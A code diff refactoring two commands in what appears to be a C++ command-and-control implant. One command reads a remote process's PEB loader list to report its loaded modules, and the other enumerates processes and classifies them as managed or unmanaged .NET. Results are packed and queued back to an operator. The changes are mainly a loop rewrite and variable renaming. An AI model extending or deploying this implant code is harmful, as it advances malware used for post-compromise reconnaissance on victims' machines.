@@ -96,31 +96,26 @@ namespace Commands {
         x_assert(pid = Process::GetProcessIdByName(Parser::UnpackString(parser, nullptr)));
         x_ntassert(Process::NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid));
 
-        if (NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size));
-            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
-            head = &loads->InMemoryOrderModuleList;
+        x_ntassert(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr));
+        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(LDR_DATA_TABLE_ENTRY*), &size));
+        x_ntassert(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr));
 
-            while (entry != head) {
-                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
-                x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
+        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = module.InMemoryOrderLinks.Flink) {
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr));
+            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size));
 
-                if (size != module.FullDllName.Length) {
-                    goto defer;
-                }
-                if (module.FullDllName.Length > 0) {
-                    size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);
+            x_assert(size == module.FullDllName.Length);
 
-                    Stream::PackString(out, modname_a);
-                    Stream::PackDword64(out, (UINT64)module.DllBase);
-                    count++;
-                }
+            if (module.FullDllName.Length > 0) {
+                size = x_wcstombs(modname_a, modname_w, module.FullDllName.Length);
 
-                x_memset(modname_w, 0, MAX_PATH);
-                x_memset(modname_a, 0, MAX_PATH);
-
-                entry = module.InMemoryOrderLinks.Flink;
+                Stream::PackString(out, modname_a);
+                Stream::PackDword64(out, (UINT64)module.DllBase);
+                count++;
             }
+
+            x_memset(modname_w, 0, MAX_PATH);
+            x_memset(modname_a, 0, MAX_PATH);
         }
 
         Dispatcher::MessageQueue(out);
@@ -139,12 +134,12 @@ namespace Commands {
         ICLRMetaHost    *meta       = { };
         ICLRRuntimeInfo *runtime    = { };
 
-        DWORD Type  = Parser::UnpackDword(parser); // listing managed/un-managed processes
-        DWORD Size  = 0;
+        DWORD type  = Parser::UnpackDword(parser); // listing managed/un-managed processes
+        DWORD size  = 0;
 
         WCHAR buffer[1024];
 
-        Size            = ARRAY_LEN(buffer);
+        size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
 
         x_assert(snapshot = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
@@ -172,7 +167,7 @@ namespace Commands {
                 if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
                     is_managed = TRUE;
 
-                    if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
+                    if (type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
                         Stream::PackDword(out, entries.th32ProcessID);
                         Stream::PackString(out, entries.szExeFile);
                         Stream::PackWString(out, buffer);
@@ -181,7 +176,7 @@ namespace Commands {
                 runtime->lpVtbl->Release(runtime);
             }
 
-            if (!is_managed && Type == UNMANAGED_PROCESS) {
+            if (!is_managed && type == UNMANAGED_PROCESS) {
                 Stream::PackDword(out, entries.th32ProcessID);
                 Stream::PackString(out, entries.szExeFile);
             }
@@ -193,6 +188,7 @@ namespace Commands {
             Ctx->nt.NtClose(process);
         }
         while (Ctx->win32.Process32Next(snapshot, &entries));
+
         Dispatcher::MessageQueue(out);
 
         defer:
